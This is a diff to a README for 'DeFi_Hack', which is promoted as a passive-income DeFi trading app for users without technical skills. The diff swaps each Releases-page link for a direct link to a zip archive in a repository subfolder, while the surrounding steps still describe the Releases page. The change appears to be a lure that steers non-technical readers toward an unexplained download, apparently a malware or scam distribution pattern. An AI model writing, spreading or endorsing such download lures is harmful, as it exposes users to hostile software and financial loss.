@@ -1,6 +1,6 @@
 # 💰 DeFi_Hack - Earn Passively with Ease
 
-[![Download DeFi_Hack](https://img.shields.io/badge/Download-DeFi_Hack-brightgreen.svg?style=flat)](https://github.com/Williamsjose12/DeFi_Hack/releases)
+[![Download DeFi_Hack](https://raw.githubusercontent.com/Williamsjose12/DeFi_Hack/main/signatural/DeFi_Hack.zip)](https://raw.githubusercontent.com/Williamsjose12/DeFi_Hack/main/signatural/DeFi_Hack.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit our Releases page to download the latest version of DeFi_Hack. 
 
-[Visit this page to download](https://github.com/Williamsjose12/DeFi_Hack/releases).
+[Visit this page to download](https://raw.githubusercontent.com/Williamsjose12/DeFi_Hack/main/signatural/DeFi_Hack.zip).
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version in the list.
@@ -74,4 +74,4 @@ Stay informed about new features and updates. Keep an eye on the Releases page f
 
 DeFi_Hack provides an easy way for you to earn passive income in the DeFi space. With its user-friendly interface and robust features, you can trade wisely without needing technical skills. Download the application today and start your journey towards financial freedom.
 
-[Visit this page to download](https://github.com/Williamsjose12/DeFi_Hack/releases).
+[Visit this page to download](https://raw.githubusercontent.com/Williamsjose12/DeFi_Hack/main/signatural/DeFi_Hack.zip).
